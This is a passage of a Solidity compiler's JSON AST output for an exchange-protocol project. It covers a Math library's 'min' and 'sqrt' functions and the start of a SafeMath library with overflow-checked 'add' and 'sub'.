																"argumentTypes": null,
																"id": 2247,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2239,
																"src": "217:1:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2248,
																"name": "y",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2241,
																"src": "221:1:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "217:5:7",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseExpression": {
															"argumentTypes": null,
															"id": 2251,
															"name": "y",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2241,
															"src": "229:1:7",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"id": 2252,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "Conditional",
														"src": "217:13:7",
														"trueExpression": {
															"argumentTypes": null,
															"id": 2250,
															"name": "x",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2239,
															"src": "225:1:7",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "213:17:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 2254,
												"nodeType": "ExpressionStatement",
												"src": "213:17:7"
											}
										]
									},
									"documentation": null,
									"id": 2256,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "min",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2242,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2239,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2256,
												"src": "147:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2238,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "147:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2241,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2256,
												"src": "158:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2240,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "158:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "146:22:7"
									},
									"returnParameters": {
										"id": 2245,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2244,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2256,
												"src": "192:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2243,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "192:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "191:11:7"
									},
									"scope": 2311,
									"src": "134:103:7",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2309,
										"nodeType": "Block",
										"src": "411:242:7",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 2265,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 2263,
														"name": "y",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 2258,
														"src": "425:1:7",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "33",
														"id": 2264,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "429:1:7",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_3_by_1",
															"typeString": "int_const 3"
														},
														"value": "3"
													},
													"src": "425:5:7",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 2301,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 2299,
															"name": "y",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2258,
															"src": "609:1:7",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "!=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 2300,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "614:1:7",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "609:6:7",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 2307,
													"nodeType": "IfStatement",
													"src": "605:42:7",
													"trueBody": {
														"id": 2306,
														"nodeType": "Block",
														"src": "617:30:7",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"id": 2304,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftHandSide": {
																		"argumentTypes": null,
																		"id": 2302,
																		"name": "z",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2261,
																		"src": "631:1:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "Assignment",
																	"operator": "=",
																	"rightHandSide": {
																		"argumentTypes": null,
																		"hexValue": "31",
																		"id": 2303,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "635:1:7",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "631:5:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"id": 2305,
																"nodeType": "ExpressionStatement",
																"src": "631:5:7"
															}
														]
													}
												},
												"id": 2308,
												"nodeType": "IfStatement",
												"src": "421:226:7",
												"trueBody": {
													"id": 2298,
													"nodeType": "Block",
													"src": "432:167:7",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 2268,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 2266,
																	"name": "z",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2261,
																	"src": "446:1:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 2267,
																	"name": "y",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2258,
																	"src": "450:1:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "446:5:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 2269,
															"nodeType": "ExpressionStatement",
															"src": "446:5:7"
														},
														{
															"assignments": [
																2271
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 2271,
																	"name": "x",
																	"nodeType": "VariableDeclaration",
																	"scope": 2298,
																	"src": "465:9:7",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 2270,
																		"name": "uint256",
																		"nodeType": "ElementaryTypeName",
																		"src": "465:7:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 2277,
															"initialValue": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2276,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 2274,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"id": 2272,
																		"name": "y",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2258,
																		"src": "477:1:7",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "/",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "32",
																		"id": 2273,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "481:1:7",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_2_by_1",
																			"typeString": "int_const 2"
																		},
																		"value": "2"
																	},
																	"src": "477:5:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "+",
																"rightExpression": {
																	"argumentTypes": null,
																	"hexValue": "31",
																	"id": 2275,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "485:1:7",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_1_by_1",
																		"typeString": "int_const 1"
																	},
																	"value": "1"
																},
																"src": "477:9:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "465:21:7"
														},
														{
															"body": {
																"id": 2296,
																"nodeType": "Block",
																"src": "514:75:7",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 2283,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 2281,
																				"name": "z",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2261,
																				"src": "532:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"id": 2282,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2271,
																				"src": "536:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "532:5:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 2284,
																		"nodeType": "ExpressionStatement",
																		"src": "532:5:7"
																	},
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 2294,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 2285,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2271,
																				"src": "555:1:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"id": 2293,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"components": [
																						{
																							"argumentTypes": null,
																							"commonType": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							},
																							"id": 2290,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"leftExpression": {
																								"argumentTypes": null,
																								"commonType": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								},
																								"id": 2288,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": false,
																								"lValueRequested": false,
																								"leftExpression": {
																									"argumentTypes": null,
																									"id": 2286,
																									"name": "y",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 2258,
																									"src": "560:1:7",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"nodeType": "BinaryOperation",
																								"operator": "/",
																								"rightExpression": {
																									"argumentTypes": null,
																									"id": 2287,
																									"name": "x",
																									"nodeType": "Identifier",
																									"overloadedDeclarations": [],
																									"referencedDeclaration": 2271,
																									"src": "564:1:7",
																									"typeDescriptions": {
																										"typeIdentifier": "t_uint256",
																										"typeString": "uint256"
																									}
																								},
																								"src": "560:5:7",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"nodeType": "BinaryOperation",
																							"operator": "+",
																							"rightExpression": {
																								"argumentTypes": null,
																								"id": 2289,
																								"name": "x",
																								"nodeType": "Identifier",
																								"overloadedDeclarations": [],
																								"referencedDeclaration": 2271,
																								"src": "568:1:7",
																								"typeDescriptions": {
																									"typeIdentifier": "t_uint256",
																									"typeString": "uint256"
																								}
																							},
																							"src": "560:9:7",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						}
																					],
																					"id": 2291,
																					"isConstant": false,
																					"isInlineArray": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"nodeType": "TupleExpression",
																					"src": "559:11:7",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "/",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "32",
																					"id": 2292,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "573:1:7",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_2_by_1",
																						"typeString": "int_const 2"
																					},
																					"value": "2"
																				},
																				"src": "559:15:7",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "555:19:7",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 2295,
																		"nodeType": "ExpressionStatement",
																		"src": "555:19:7"
																	}
																]
															},
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 2280,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 2278,
																	"name": "x",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2271,
																	"src": "507:1:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "<",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 2279,
																	"name": "z",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 2261,
																	"src": "511:1:7",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "507:5:7",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"id": 2297,
															"nodeType": "WhileStatement",
															"src": "500:89:7"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"id": 2310,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sqrt",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2259,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2258,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2310,
												"src": "366:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2257,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "366:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "365:11:7"
									},
									"returnParameters": {
										"id": 2262,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2261,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2310,
												"src": "400:9:7",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2260,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "400:7:7",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "399:11:7"
									},
									"scope": 2311,
									"src": "352:301:7",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								}
							],
							"scope": 2312,
							"src": "115:540:7"
						}
					],
					"src": "36:620:7"
				},
				"id": 7
			},
			"src/exchange-protocol/contracts/libraries/SafeMath.sol": {
				"ast": {
					"absolutePath": "src/exchange-protocol/contracts/libraries/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							2386
						]
					},
					"id": 2387,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 2313,
							"literals": [
								"solidity",
								">=",
								"0.5",
								".0",
								"<",
								"0.7",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "36:31:8"
						},
						{
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": null,
							"fullyImplemented": true,
							"id": 2386,
							"linearizedBaseContracts": [
								2386
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 2334,
										"nodeType": "Block",
										"src": "267:66:8",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2330,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"id": 2327,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 2323,
																			"name": "z",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2320,
																			"src": "286:1:8",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 2326,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 2324,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2315,
																				"src": "290:1:8",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 2325,
																				"name": "y",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2317,
																				"src": "294:1:8",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "290:5:8",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "286:9:8",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 2328,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "285:11:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2329,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2315,
																"src": "300:1:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "285:16:8",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "64732d6d6174682d6164642d6f766572666c6f77",
															"id": 2331,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "303:22:8",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_3903056b84ed2aba2be78662dc6c5c99b160cebe9af9bd9493d0fc28ff16f6db",
																"typeString": "literal_string \"ds-math-add-overflow\""
															},
															"value": "ds-math-add-overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_3903056b84ed2aba2be78662dc6c5c99b160cebe9af9bd9493d0fc28ff16f6db",
																"typeString": "literal_string \"ds-math-add-overflow\""
															}
														],
														"id": 2322,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2446,
															2447
														],
														"referencedDeclaration": 2447,
														"src": "277:7:8",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 2332,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "277:49:8",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 2333,
												"nodeType": "ExpressionStatement",
												"src": "277:49:8"
											}
										]
									},
									"documentation": null,
									"id": 2335,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 2318,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2315,
												"name": "x",
												"nodeType": "VariableDeclaration",
												"scope": 2335,
												"src": "211:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2314,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "211:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 2317,
												"name": "y",
												"nodeType": "VariableDeclaration",
												"scope": 2335,
												"src": "222:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2316,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "222:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "210:22:8"
									},
									"returnParameters": {
										"id": 2321,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 2320,
												"name": "z",
												"nodeType": "VariableDeclaration",
												"scope": 2335,
												"src": "256:9:8",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 2319,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "256:7:8",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "255:11:8"
									},
									"scope": 2386,
									"src": "198:135:8",
									"stateMutability": "pure",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 2356,
										"nodeType": "Block",
										"src": "408:67:8",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 2352,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"components": [
																	{
																		"argumentTypes": null,
																		"id": 2349,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftHandSide": {
																			"argumentTypes": null,
																			"id": 2345,
																			"name": "z",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2342,
																			"src": "427:1:8",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "Assignment",
																		"operator": "=",
																		"rightHandSide": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 2348,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 2346,
																				"name": "x",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2337,
																				"src": "431:1:8",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"id": 2347,
																				"name": "y",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2339,
																				"src": "435:1:8",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"src": "431:5:8",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"src": "427:9:8",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"id": 2350,
																"isConstant": false,
																"isInlineArray": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "TupleExpression",
																"src": "426:11:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 2351,
																"name": "x",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2337,
																"src": "441:1:8",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "426:16:8",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "64732d6d6174682d7375622d756e646572666c6f77",
															"id": 2353,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "444:23:8",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_03b20b9f6e6e7905f077509fd420fb44afc685f254bcefe49147296e1ba25590",
																"typeString": "literal_string \"ds-math-sub-underflow\""
															},
															"value": "ds-math-sub-underflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
